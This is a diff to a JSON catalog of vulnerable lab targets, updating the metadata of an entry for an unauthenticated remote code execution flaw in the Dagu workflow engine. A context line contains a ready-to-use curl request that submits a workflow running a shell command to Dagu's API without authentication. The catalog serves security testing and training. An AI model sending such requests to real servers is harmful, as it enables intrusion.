@@ -1,6 +1,6 @@
 [
   {
-    "id": "vt-dagu-rce",
+    "id": "vt-dagu",
     "info": {
       "name": "Dagu Workflow Engine - Unauthenticated Remote Code Execution",
       "author": "omarkurt",
@@ -30,7 +30,8 @@
       ],
       "references": [
         "https://github.com/advisories/GHSA-6qr9-g2xw-cw92",
-        "https://github.com/dagu-org/dagu"
+        "https://github.com/dagu-org/dagu",
+        "https://vulnerabletarget.com/vt-dagu"
       ]
     },
     "vulnerabilities": [
@@ -87,7 +88,7 @@
       "Test: curl -s -X POST http://localhost:8080/api/v2/dag-runs -H 'Content-Type: application/json' -d '{\"name\":\"poc\",\"spec\":\"steps:\\n  - name: rce\\n    command: id\\n\"}'"
     ],
     "category": "http",
-    "added_date": "2026-02-20T13:53:35+03:00"
+    "added_date": "2026-02-20T13:56:09+03:00"
   },
   {
     "id": "vt-vlife",
